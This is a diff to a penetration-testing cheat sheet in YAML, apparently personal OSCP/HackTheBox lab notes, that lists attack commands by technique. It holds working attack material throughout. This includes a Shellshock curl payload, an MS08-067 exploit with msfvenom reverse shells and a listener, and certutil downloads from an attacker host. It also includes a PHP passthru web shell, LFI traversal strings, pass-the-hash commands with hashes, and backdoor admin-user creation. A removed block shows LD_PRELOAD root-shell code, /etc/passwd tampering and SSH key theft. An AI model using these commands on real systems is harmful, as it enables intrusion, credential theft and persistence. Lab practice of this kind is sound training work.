@@ -369,22 +369,31 @@ summary:
       - find critical cve/exploits
       - enumerate more common services - smb/ftp
       - enumerate services with large attack vector like http at the end
+      references:
+      - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Methodology%20and%20enumeration.md
     exploit:
       goal: gain interactive access on <targetip>
       process:
       - debug available exploits for open ports
+      references:
+      - https://fareedfauzi.github.io/notes/Boot2Root-Notes/
+      - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CVE%20Exploits
     privesc:
       goal: gain elevated privileges on <targetip>
       process:
       - debug available exploits or misconfigurations
-      - for nix, use linux smart enum (lse) - https://github.com/diego-treitos/linux-smart-enumeration
-      - for windows, use winpeas - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
+      - for nix, use [linux smart enum](https://github.com/diego-treitos/linux-smart-enumeration)
+      - for windows, use [winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
+      references:
+      - https://github.com/rayhan0x01/reverse-shell-able-exploit-pocs
+      - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+      - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
     recon:
       goal: to scan all ports on <targetip>
       process:
-      - '[enumerate_nmap_initial](https://github.com/7h3rAm/writeupsall/blob/master/readme.md#enumerate_nmap_initial)'
-      - '[enumerate_nmap_tcp](https://github.com/7h3rAm/writeupsall/blob/master/readme.md#enumerate_nmap_tcp)'
-      - '[enumerate_nmap_udp](https://github.com/7h3rAm/writeupsall/blob/master/readme.md#enumerate_nmap_udp)'
+      - '[enumerate_nmap_initial](#enumerate_nmap_initial)'
+      - '[enumerate_nmap_tcp](#enumerate_nmap_tcp)'
+      - '[enumerate_nmap_udp](#enumerate_nmap_udp)'
   plot:
     categories:
       htb: 13
@@ -3574,7 +3583,18 @@ summary:
         - 8080/tcp
         - 443/tcp
         references:
-        - null
+        - https://zayotic.com/posts/oscp-reference/
+      enumerate_app_joomla:
+        cli: 'joomscan --url http://<targetip>
+
+          '
+        description: null
+        ports:
+        - 80/tcp
+        - 8080/tcp
+        - 443/tcp
+        references:
+        - https://zayotic.com/posts/oscp-reference/
       enumerate_app_mongo:
         cli: 'mongo -p -u mark scheduler => connects to mongodb as user mark and allows
           interaction with db scheduler
@@ -3714,8 +3734,8 @@ summary:
       enumerate_app_wordpress:
         cli: "default creds: admin/password\nlook for phpmyadmin, plugins directories\n\
           look for wp-config.php file (via an open smb/ftp share) => contains db creds,\
-          \ useful for phpmyadmin and ssh\nenumerate authors:\n  http://192.168.92.167:8080/?author=1\
-          \ => will show username as \"AUTHOR ARCHIVES: <username>\"\n  http://192.168.92.167:8080/?author=2\
+          \ useful for phpmyadmin and ssh\nenumerate authors:\n  http://192.168.92.167:<targetport>/?author=1\
+          \ => will show username as \"AUTHOR ARCHIVES: <username>\"\n  http://192.168.92.167:<targetport>/?author=2\
           \ => will not show username if author id is invalid\n  wpuser http://192.168.92.134/\
           \ usernames\nwpscan --url http://192.168.92.134:80/ -e vp,vt,tt,cb,dbe,u,m\n\
           bruteforce wordpress login:\n  wpscan --url http://192.168.92.134 -P fsocity.dic.trimmed\
@@ -3910,17 +3930,16 @@ summary:
         references:
         - null
       enumerate_proto_ftp:
-        cli: "high level process:\n  Version number and associated CVEs\n  Anonymous\
-          \ / authenticated login (with discovered creds)\n  Sensitive files that\
-          \ you have read access to\n  File upload\n\nnmap --script=*ftp* --script-args=unsafe=1\
-          \ -p 20,21 <targetip>\nnmap -sV -Pn -vv -p 21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221\
-          \ <targetip>\nhydra -s 21 -C /usr/share/sparta/wordlists/ftp-default-userpass.txt\
-          \ -u -f <targetip> ftp\nftp passive mode:\n  ftp -p 192.168.92.192\nbruteforce\
-          \ ftp login:\n  use auxiliary/scanner/ftp/ftp_login\ncheck if version is\
-          \ vulnerable and exploit is available\ncheck if anonymous access is enabled\n\
-          check if write permission within uploads directory\ncheck if ftp root directory\
-          \ is also http root directory and upload php reverse shell\n"
-        description: null
+        cli: "ftp passive mode:\n  ftp -p 192.168.92.192\nbruteforce ftp login:\n\
+          \  use auxiliary/scanner/ftp/ftp_login\nmisc:\n  nmap --script=*ftp* --script-args=unsafe=1\
+          \ -p 20,21 <targetip>\n  nmap -sV -Pn -vv -p 21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221\
+          \ <targetip>\n  hydra -s 21 -C /usr/share/sparta/wordlists/ftp-default-userpass.txt\
+          \ -u -f <targetip> ftp\n"
+        description: check if version is vulnerable and exploit is available. check
+          if anonymous access is enabled. check if read permission for sensitive files.
+          check if write permission within webroot/uploads or other critical directories.
+          check if ftp root directory is also http root directory and upload php reverse
+          shell. remember - binary and ascii transfer mode switch
         ports:
         - 21/tcp
         references:
@@ -3946,20 +3965,7 @@ summary:
           url: https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf
       enumerate_proto_http:
-        cli: 'identify web server, technology, application
-
-          identify versions
-
-          run nikto, dirb/dirbuster, gobuster scans
-
-          look at robots.txt
-
-          look at source code
-
-          check for default creds, lfi/rfi, sqli, wordpress
-
-
-          bash /usr/share/sparta/scripts/x11screenshot.sh <targetip>
+        cli: 'bash /usr/share/sparta/scripts/x11screenshot.sh <targetip>
 
           cewl http://<targetip>:<targetport>/ -m 6, "http,https,ssl,soap,http-proxy,http-alt"
           ## create wordlist by crawling webpage
@@ -4011,7 +4017,9 @@ summary:
           ## identify web technology
 
           '
-        description: null
+        description: identify web server, technology, application. identify versions.
+          run nikto, dirb/dirbuster, gobuster scans. look at robots.txt. look at source
+          code. check for default creds, lfi/rfi, sqli, wordpress
         ports:
         - 80/tcp
         - 8080/tcp
@@ -4168,7 +4176,7 @@ summary:
           '
         description: null
         ports:
-        - 3389/tcp
+        - 8080/tcp
         references:
         - null
       enumerate_proto_rpc:
@@ -5305,9 +5313,13 @@ summary:
         cli: 'curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c ''cat /etc/passwd''"
           http://<targetip>/cgi-bin/user.sh
 
+          nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls
+          <targetip>
+
           '
         description: null
         references:
+        - https://zayotic.com/posts/oscp-reference/
         - https://highon.coffee/blog/shellshock-pen-testers-lab-walkthrough/
         - https://blog.knapsy.com/blog/2014/10/07/basic-shellshock-exploitation/
         writeups:
@@ -5324,14 +5336,16 @@ summary:
           url: https://www.hackthebox.eu/home/machines/profile/108
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.shocker/writeup.pdf
       exploit_smb_ms08_067:
-        cli: "nmap -p 445 -script smb-check-vulns -script-args=unsafe=1 <targetip>\n\
-          msfcli auxiliary/scanner/smb/ms08_067_check rhosts=<targetip> threads=100\
-          \ E\nmanual:\n  wget https://raw.githubusercontent.com/andyacer/ms08_067/master/ms08_067_2018.py\n\
+        cli: "scan:\n  nmap -v -p 139,445 --script=smb-check-vulns --script-args=unsafe=1\
+          \ <targetip>\n  msfcli auxiliary/scanner/smb/ms08_067_check rhosts=<targetip>\
+          \ threads=100 E\nmanual_a:\n  wget https://raw.githubusercontent.com/andyacer/ms08_067/master/ms08_067_2018.py\n\
           \  msfvenom -p windows/shell_reverse_tcp LHOST=<attackerip> LPORT=<attackerport>\
           \ EXITFUNC=thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -f c -a\
           \ x86 --platform windows\n  nc -nlvp <attackerport>\n  python ms08_067_2018.py\
-          \ <targetip> <osid> <targetport>\nmsf:\n  use exploit/windows/smb/ms08_067_netapi\n\
-          \  set RHOST <targetip>\n  set LHOST <attackerip>\n  show options\n  exploit\n"
+          \ <targetip> <osid> <targetport>\nmanual_b:\n  searchsploit ms08-067\n \
+          \ python /usr/share/exploitdb/platforms/windows/remote/7132.py <targetip>\
+          \ 1\nmsf:\n  use exploit/windows/smb/ms08_067_netapi\n  set RHOST <targetip>\n\
+          \  set LHOST <attackerip>\n  show options\n  exploit\n"
         description: (netapi exploit) for microsoft windows xp systems with open smb
           ports, use the [ms08-067](https://github.com/andyacer/ms08_067) metasploit
           module [`windows/smb/ms08_067_netapi`]()
@@ -6157,7 +6171,7 @@ summary:
       privesc_lxc_bash:
         cli: 'check output of id command
 
-          if user member of lxd group, follow https://reboare.github.io/lxd/lxd-escape.html
+          if user is member of lxd group, follow https://reboare.github.io/lxd/lxd-escape.html
 
           '
         description: null
@@ -6770,9 +6784,9 @@ summary:
       privesc_windows_ms10_059:
         cli: 'wget https://github.com/abatchy17/WindowsExploits/raw/master/MS10-059%20-%20Chimichurri/MS10-059.exe
 
-          sharehttp 8080
+          sharehttp <targetport>
 
-          certutil.exe -urlcache -split -f "http://<attackerip>:8080/MS10-059.exe"
+          certutil.exe -urlcache -split -f "http://<attackerip>:<targetport>/MS10-059.exe"
           pe.exe
 
           nc -nlvp 444
@@ -6889,33 +6903,6 @@ summary:
         references:
         - https://www.hackingdream.net/2020/03/windows-privilege-escalation-cheatsheet-for-oscp.html
   tips:
-  - cli: 'https://github.com/ajdumanhug/oscp-practice
-
-      '
-    description: oscp practise
-  - cli: 'prefix: ctrl + b
-
-      toggle logging: prefix + shift + p
-
-      screen cap: prefix + alt + p
-
-      complete history: prefix + alt + shift + p
-
-      '
-    description: tmux shortcuts
-  - cli: 'machinescli: update local stats for htb|vh|oscplike|owned machines, query
-      stats, search for ippsec writeups or vh description, track owned|oscplike machines
-
-      svachal: writeups manager, can start|finish|rebuild|summarize writeups, auto
-      updates readme and metanotes md files, auto creates ttps csv for openports|ttps
-      shortcuts
-
-      openports: shows open ports from autorecon|manual scan results
-
-      ttps: shows ttps for open ports, can find both suggested and itw ttps
-
-      '
-    description: shell shortcuts
   - cli: "bs.c\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <stdlib.h>\n\
       #include <unistd.h>\nint main(int argc, char* argv[]) {\n  int host_sock = socket(AF_INET,\
       \ SOCK_STREAM, 0);\n  struct sockaddr_in host_addr;\n  host_addr.sin_family\
@@ -7018,28 +7005,33 @@ summary:
 
       '
     description: iptables
-  - cli: "https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI\nuniscan\
-      \ -u http://<targetip>/ -qweds\nwfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt\
-      \ --hc 404 http://<targetip>/FUZZ\nhttps://snowscan.io/htb-writeup-friendzone/\n\
-      php://filter/convert.base64-encode/resource=<pagename>\nhttp://zerofreak.blogspot.com/2012/04/lfi-exploitation-via-phpinput-shelling.html\n\
-      php command execution: <? passthru($_GET[cmd]) ?>\nbypass upload filter:\n \
-      \ change extension to PHP, PHP3, PHP4, PHP5\n  add magic bytes to start of file\
-      \ (eg: GIF87 to a php shell) to evade upload filters\nhttps://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/\n\
-      local file access: http://<targetip>/?page=php://filter/convert.base64-encode/resource=index\n\
-      notice urls that accept a generic filename as parameter: ?page=file1.php\n?page=../../../../../../etc/passwd\n\
-      ?page=../../../../../../windows/system32/drivers/etc/hosts\nippsec steps (htb.beep:\
-      \ https://youtu.be/XJmBpOd__N8) :\n/etc/passwd\n/proc/self/status\nfind home\
-      \ username in passwd, locate home directory for user\n/var/lib/asterisk/.ssh/id_rsa\n"
+  - cli: "scan:\n  uniscan -u http://<targetip>/ -qweds\n  wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt\
+      \ --hc 404 http://<targetip>/FUZZ\nphp b64 leak and command execution:\n  php://filter/convert.base64-encode/resource=<pagename>\n\
+      \  <?php echo passthru($_GET[cmd]) ?>\nbypass upload filter:\n  change extension\
+      \ to PHP, PHP3, PHP4, PHP5\n  add magic bytes to start of file (eg: GIF87 to\
+      \ a php shell) to evade upload filters\nlocal file access: http://<targetip>/?page=php://filter/convert.base64-encode/resource=index\n\
+      notice urls that accept a generic filename as parameter:\n  ?page=file1.php\n\
+      \  ?page=../../../../../../etc/passwd\n  ?page=../../../../../../windows/system32/drivers/etc/hosts\n\
+      ippsec steps (htb.beep: https://youtu.be/XJmBpOd__N8):\n  /etc/passwd\n  /proc/self/status\n\
+      find home username in passwd, locate home directory for user:\n  /var/lib/asterisk/.ssh/id_rsa\n"
     description: lfi/rfi/image upload
-  - cli: 'fgdump.exe
-
-      /usr/bin/pth-winexe -U administrator%0182BD0BD4444BF836077A718CCDF409:259745CB123A52AA2E693AAACCA2DB52
-      //<targetip> cmd.exe
-
-      wmiexec.exe -hashes 0182BD0BD4444BF836077A718CCDF409:259745CB123A52AA2E693AAACCA2DB52
-      administrator@localhost
-
-      '
+    references:
+    - http://<targetip>/index.php?file=php://filter/convert.base64-encode/resource=index.php
+    - http://zerofreak.blogspot.com/2012/04/lfi-exploitation-via-phpinput-shelling.html
+    - https://gist.github.com/AvasDream/47f13a510e543009a50c8241276afc24
+    - https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI
+    - https://snowscan.io/htb-writeup-friendzone/
+    - https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/
+  - cli: "pth-toolkit:\n  git clone https://github.com/byt3bl33d3r/pth-toolkit\n \
+      \ pth-winexe -U hash //IP cmd\nxfreerdp:\n  apt-get install freerdp-x11\n  xfreerdp\
+      \ /u:offsec /d:win2012 /pth:HASH /v:IP\nmeterpreter:\n  meterpreter > run post/windows/gather/hashdump\n\
+      \  Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\n\
+      \  msf > use exploit/windows/smb/psexec\n  msf exploit(psexec) > set payload\
+      \ windows/meterpreter/reverse_tcp\n  msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c\n\
+      \  msf exploit(psexec) > exploit\n  meterpreter > shell\nmisc:\n  fgdump.exe\n\
+      \  /usr/bin/pth-winexe -U administrator%0182BD0BD4444BF836077A718CCDF409:259745CB123A52AA2E693AAACCA2DB52\
+      \ //<targetip> cmd.exe\n  wmiexec.exe -hashes 0182BD0BD4444BF836077A718CCDF409:259745CB123A52AA2E693AAACCA2DB52\
+      \ administrator@localhost\n"
     description: passthehash
   - cli: 'shadow file structure: $id$salt$password
 
@@ -7053,36 +7045,40 @@ summary:
 
       '
     description: passwords
-  - cli: "windows:\nadd a new administrator user:\n  net user anderson cooper /add\
-      \ && net localgroup administrators anderson /add\nadd user to rdp group:\n \
-      \ net localgroup \"Remote Desktop Users\" anderson /add\nenable rdp in firewall:\n\
-      \  netsh firewall add portopening TCP 3389 \"RDP\"\nenable rdp via registry\
-      \ (requries reboot):\n  reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\\
-      Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nis rdp\
-      \ service running:\n  tasklist /svc | findstr /c:TermService\nstart rdp service:\n\
-      \  net start TermService\npermanently enable rdp service:\n  sc config TermService\
-      \ start=auto\nuseradd.c\n  #include <stdlib.h>\n  int main() {\n    int i;\n\
-      \    i=system(\"net user anderson cooper /add && net localgroup administrators\
-      \ anderson /add\");\n    return 0;\n  }\nwindows - add user:\n  #include <stdlib.h>\
-      \ /* system, NULL, EXIT_FAILURE */\n  int main() {\n    int i;\n    i=system(\"\
+  - cli: "add a new administrator user:\n  net user anderson cooper /add && net localgroup\
+      \ administrators anderson /add\nadd user to rdp group:\n  net localgroup \"\
+      Remote Desktop Users\" anderson /add\nenable rdp in firewall:\n  reg add \"\
+      hklm\\system\\currentcontrolset\\control\\terminal server\" /f /v fDenyTSConnections\
+      \ /t REG_DWORD /d 0\n  netsh firewall set service remoteadmin enable\n  netsh\
+      \ firewall set service remotedesktop enable\n  netsh firewall add portopening\
+      \ TCP <targetport> \"RDP\"\nenable rdp via registry (requries reboot):\n  reg\
+      \ add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"\
+      \ /v fDenyTSConnections /t REG_DWORD /d 0 /f\nis rdp service running:\n  tasklist\
+      \ /svc | findstr /c:TermService\nstart rdp service:\n  net start TermService\n\
+      permanently enable rdp service:\n  sc config TermService start=auto\ncode:\n\
+      \  useradd.c:\n    #include <stdlib.h>\n    int main() {\n      int i;\n   \
+      \   i=system(\"net user anderson cooper /add && net localgroup administrators\
+      \ anderson /add\");\n      return 0;\n    }\n  add user:\n    #include <stdlib.h>\
+      \ /* system, NULL, EXIT_FAILURE */\n    int main() {\n      int i;\n      i=system(\"\
       net user anderson cooper /add && net localgroup administrators anderson /add\"\
-      );\n    return 0;\n  }\n  # compile: i686-w64-mingw32-gcc -o useradd.exe useradd.c\n"
+      );\n      return 0;\n    }\n    # compile: i686-w64-mingw32-gcc -o useradd.exe\
+      \ useradd.c\n"
     description: persistence
-  - cli: 'socat tcp-listen:8080,fork,reuseaddr tcp:127.0.0.1:80 &
-
-      socat tcp-listen:8065,fork,reuseaddr tcp:127.0.0.1:65334 &
-
-
-      plink.exe -v -x -a -T -C -noagent -ssh -pw "<localpassword>" -R <targetport>:127.0.0.1:<targetport>
-      <localuser>@<attackerip>
-
-      '
+    references:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md
+  - cli: "socat:\n  socat tcp-listen:<targetport>,fork,reuseaddr tcp:127.0.0.1:80\
+      \ &\n  socat tcp-listen:8065,fork,reuseaddr tcp:127.0.0.1:65334 &\nplink:\n\
+      \  plink.exe -v -x -a -T -C -noagent -ssh -pw \"<localpassword>\" -R <targetport>:127.0.0.1:<targetport>\
+      \ <localuser>@<attackerip>\nmeterpreter:\n  # https://www.offensive-security.com/metasploit-unleashed/portfwd/\n\
+      \  # forward remote port to local address\n  meterpreter > portfwd add --l <targetport>\
+      \ --p <targetport> --r <targetip>\n  kali > rdesktop 127.0.0.1:<targetport>\n"
     description: port forward
-  - cli: 'knock once on port 8080/tcp:
+  - cli: 'knock once on port <targetport>/tcp:
 
-      hping3 <targetip> -S -p 8080 -c 1
+      hping3 <targetip> -S -p <targetport> -c 1
 
-      nc -vvvz <targetip> 8080
+      nc -vvvz <targetip> <targetport>
 
       knock on multiple tcp ports in a given sequence:
 
@@ -7096,305 +7092,20 @@ summary:
     references:
     - https://blog.knapsy.com/blog/2014/10/16/knock-knock-vm-walkthrough/
     - https://highon.coffee/blog/fartknocker-walkthrough/
-  - cli: "lpeworkshop (https://github.com/sagishahar/lpeworkshop) and lpe course (https://www.udemy.com/course/linux-privilege-escalation/):\n\
-      linux:\n  id ; whoami ; uname -a ; w ; lsb_release -a\n  enumerate:\n    tools:\n\
-      \    lse.sh:\n      ./lse.sh -l2 # show all gathered info\n      ./lse.sh -l2\
-      \ -c # disable colors\n    linenum.sh\n    linux-exploit-suggester-2.pl # kernel\
-      \ exploitation\n    misc techniques (https://twitter.com/JaneScott_/status/1144134954353217536):\n\
-      \    find /var/www -xdev -perm -o+w -ls ; echo \"<?php passthru($_GET['cmd']);\
-      \ ?>\" > /var/www/<output from first command>/backdoor.php\n    ./unix-privesc-check\
-      \ detailed && find / -xdev -perm -u+s -type f -ls && find / -xdev -perm -o+w\
-      \ -ls\n    wget https://raw.githubusercontent.com/zMarch/Orc/master/o.rc &&\
-      \ ENV=o.rc sh -i \"gethelp\"\n    w;uname -a;lsb_release -a\n    find -O3 /\
-      \ -perm -u=s -type f -ls 2>/dev/null\n    cat /home/*/.ssh/id_rsa\n    history\
-      \ ; find / -perm -4000 -exec ls -l {} \\;\n    find / -type f -mmin -60 -ls\
-      \ 2>/dev/null # find recently modified files; can use pspy alternatively\n \
-      \ spawn root shell:\n    suid bash:\n    create a copy of /bin/bash, make sure\
-      \ it is owned by root user and has suid bit set. this is a persistent method\
-      \ and can be used to gain root privileges on demand using the -p flag at invocation\n\
-      \    custom executable:\n    if we control a process that gets executed by a\
-      \ root process (eg: cron jobs), use the following code to create a custom binary\
-      \ for the initial process under our control:\n      int main(){setuid(0);system(\"\
-      /bin/bash -p\");}\n      gcc -o rootbash rootbash.c\n    msfvenom can also be\
-      \ used in case a reverse shell is desired (use netcat or multi/handler to catch\
-      \ incoming connection):\n      msfvenom-p linux/x86/shell_reverse_tcpLHOST=<attackerip>\
-      \ LPORT=<attackerport> -f elf >rootbash\n  kernel:\n    manual:\n    $ uname\
-      \ -a\n      Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014\
-      \ x86_64 GNU/Linux\n    # searchsploit linux kernel 2.6.32 priv esc debian\n\
-      \    # linux-exploit-suggester-2.pl -k 2.6.32\n    dirtycow:\n    affected kernel\
-      \ versions: 2.6.22 < 4.8.3\n    https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs\n\
-      \    https://www.exploit-db.com/exploits/40839\n      gcc -pthread -lcrypt -o\
-      \ 40839 40839.c\n      ./40839 # enter password when prompted, press ctrl+c\
-      \ if needed\n      su <username>\n    https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54\n\
-      \      gcc -pthread c0w.c -o c0w\n      ./c0w\n      /usr/bin/passwd\n    vmsplice:\n\
-      \    https://www.exploit-db.com/exploits/5092\n  service:\n    manual:\n   \
-      \   find services running as root:\n        $ ps aux | grep \"^root\"\n    \
-      \  find program version:\n        $ <program> --version\n        $ <program>\
-      \ -v\n        $ dpkg -l | grep <program>\n        $ rpm -qa | grep <program>\n\
-      \    apache2:\n      sudo -l => shows apache2 can be run as sudo\n      sudo\
-      \ apache2 -f /etc/shadow => will throw an error upon reading the first line\
-      \ of shadow file and dump hash on stdout, copy it to a file\n      john --format=crypt\
-      \ --wordlist=/usr/share/wordlists/nmap.lst hash\n    exim:\n      dpkg -l |\
-      \ grep -i exim => version <4.86.2\n      exim -bV -v | grep -i perl => compiled\
-      \ with perl support\n      head /etc/exim.conf => configuration has perl_startup\
-      \ option\n      ./cve_2016-1521.sh\n    lxd:\n      check output of id command\n\
-      \      if user member of lxd group, follow https://reboare.github.io/lxd/lxd-escape.html\n\
-      \    mysqld:\n      when mysql is running as root\n      mysql has ability to\
-      \ install uder defined functions which run via shared objects\n      use [edb:1518](https://www.exploit-db.com/exploits/1518)\n\
-      \      once exploit is complete, do the following:\n        mysql> select do_system('cp\
-      \ /bin/bash /tmp/rootbash; chmod+s /tmp/rootbash');\n        mysql> exit\n \
-      \       $ /tmp/rootbash -p\n        rootbash-4.1# id\n          uid=1000(user)\
-      \ gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\
-      \    strace:\n      https://gtfobins.github.io/gtfobins/strace/\n      write\
-      \ a c program to run bin/bash and strace it: https://hackso.me/lin.security-1-walkthrough/\n\
-      \    udev:\n    netlink:\n        https://www.exploit-db.com/exploits/8478\n\
-      \        affected udev versions: <1.4.1\n        cat /proc/net/netlink\n   \
-      \     select pid for group \"ffffffff\"\n    port forwarding:\n      if the\
-      \ root process is bound to an internal port and for some reason we cannot run\
-      \ the exploit locally, use port forwarding via ssh:\n      $ ssh -R <local-port>:127.0.0.1:<target-port>\
-      \ <username>@<local-machine>\n  weak file permissions:\n    important commands:\n\
-      \    $ find /etc -maxdepth 1 -writable -type f\n    $ find /etc -maxdepth 1\
-      \ -readable -type f\n    $ find / -executable -writable -type d 2> /dev/null\n\
-      \    /etc/shadow file:\n    if we have read permissions, use it to extract password\
-      \ and crack it:\n      # echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0'\
-      \ > hash.txt'\n      # john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt\
-      \ hash.txt\n      $ su\n    if we have write permissions, use it to edit entry\
-      \ for root password hash we know:\n      $ cp /etc/shadow /tmp/shadow.bck\n\
-      \      # mkpasswd-m sha-512 <newpassword>\n      $ echo -en \"root:$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/:17298:0:<attackerport>9:7:::\"\
-      \ >>/etc/shadow\n      $ su\n    /etc/passwd file:\n    hash within passwd file\
-      \ takes precedence over hash in shadow file\n    if we can only append, create\
-      \ a uid 0 entry for a new user (linux allows multiple users with different names\
-      \ to have uid 0)\n      $ cp /etc/passwd /tmp/passwd.bck\n      $ openssl passwd\
-      \ \"newpassword\"\n      $ echo -en \"newroot:SkZvJDdq90GJw:0:0:root:/root:/bin/bash\"\
-      \ >>/etc/passwd\n      $ su newroot\n    backups:\n    backups of sensitive\
-      \ files can prove useful when those files themselves are not accessible\n  \
-      \  look for readable files within below directories:\n      ls -la / /home/*\
-      \ /tmp/ /var/backups\n    if we have read permission for .ssh directory, check\
-      \ if we can ssh as root and then if we can, copy .ssh/id_rsa to your system:\n\
-      \      $ grep PermitRootLogin /etc/ssh/sshd_config\n      # chmod 600 id_rsa\n\
-      \      # ssh -i id_rsa root@<targetip>\n  sudo:\n    list allowed programs:\n\
-      \    sudo -l\n    if user is member of sudo group and user password is available:\n\
-      \    sudo su\n    other methods:\n    sudo -s\n    sudo -i\n    sudo /bin/bash\n\
-      \    sudo passwd\n    shell escape sequences:\n    https://gtfobins.github.io/\n\
-      \    sudo -l:\n      awk: sudo awk 'BEGIN {system(\"/bin\")}'\n      find: sudo\
-      \ find /bin -name nano -exec /bin/sh \\;\n      vim: sudo vim -c '!sh'\n   \
-      \   nmap:\n        non-interactive: echo \"os.execute('/bin/sh')\" >shell.nse\
-      \ && sudo nmap --script=shell.nse\n        interactive:\n        nmap --interactive\n\
-      \          > !sh\n    abuse intended functionality:\n    if escape sequneces\
-      \ don't work, we can still leverage sudo privs to read/write root owned files\n\
-      \    apache2:\n      $ sudo -l\n        ...(root) NOPASSWD: /usr/sbin/apache2\n\
-      \      $ sudo apache2 -f /etc/shadow\n        Syntax error on line 1 of /etc/shadow:\n\
-      \        Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:<attackerport>9:7:::',\
-      \ perhaps misspelled or defined by a module not included in the server configuration\n\
-      \      $ echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0'\
-      \ >hash.txt'\n      $ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt\
-      \ hash.txt\n      $ su\n    env_keep:\n    programs run through sudo can inherit\
-      \ environment variables, if env_keep option is set. they won't if env_reset\
-      \ is set. can be checked via \"sudo -l\"\n    LD_PRELOAD:\n      an environment\
-      \ variable which can be set to the path of a shared object (.so) file\n    \
-      \  when set, the shared object will be loaded before any others\n      creating\
-      \ a custom shared object and creating an init() function, we can execute code\
-      \ as soon as the object is loaded\n      LD_PRELOAD doesn't work if ruid !=\
-      \ euid\n      sudo must be configured to preserve LD_PRELOAD via env_keep\n\
-      \        $ sudo-l\n        Matching Defaults entries for user on this host:\n\
-      \        env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH\n      create\
-      \ a preload.c file:\n        #include <stdio.h>\n        #include <sys/types.h>\n\
-      \        #include <stdlib.h>\n        void _init(){unsetenv(\"LD_PRELOAD\");setresuid(0,0,0);system(\"\
-      /bin/bash -p\");}\n        $ gcc -fPIC -shared -nostartfiles-o /tmp/preload.so\
-      \ preload.c\n        $ sudo LD_PRELOAD=/tmp/preload.so apache2\n        # id\n\
-      \        uid=0(root) gid=0(root) groups=0(root)\n    LD_LIBRARY_PATH:\n    \
-      \  an environment variable that contains a set of directories where shared libraries\
-      \ are searched for first\n      the ldd command can be used to print the shared\
-      \ libraries used by a program:\n        $ ldd /usr/sbin/apache2\n      by creating\
-      \ a shared library with the same name as one used by a program, and setting\
-      \ LD_LIBRARY_PATH to its parent directory, the program will load our shared\
-      \ library instead\n      sudo must be configured to preserve LD_LIBRARY_PATH\
-      \ via env_keep\n        $ sudo-l\n        Matching Defaults entries for user\
-      \ on this host:\n        env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH\n\
-      \      create a library_path.c file:\n        #include <stdio.h>\n        #include\
-      \ <stdlib.h>\n        static void hijack() __attribute__((constructor));void\
-      \ hijack(){unsetenv(\"LD_LIBRARY_PATH\");setresuid(0,0,0);system(\"/bin/bash\
-      \ -p\");}\n        $ gcc-o libcrypt.so.1 -shared -fPIC library_path.c\n    \
-      \    $ sudo LD_LIBRARY_PATH=. apache2\n        # id\n        uid=0(root) gid=0(root)\
-      \ groups=0(root)\n  cron:\n    user cronjobs are stored in /var/spool/cron/\
-      \ or /var/spool/cron/crontabs/ , system cronjobs are stored in /etc/crontab\n\
-      \    file overwrite:\n    $ cat /etc/crontab => overwrite.sh is run as root\
-      \ and is world writable\n    $ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'\
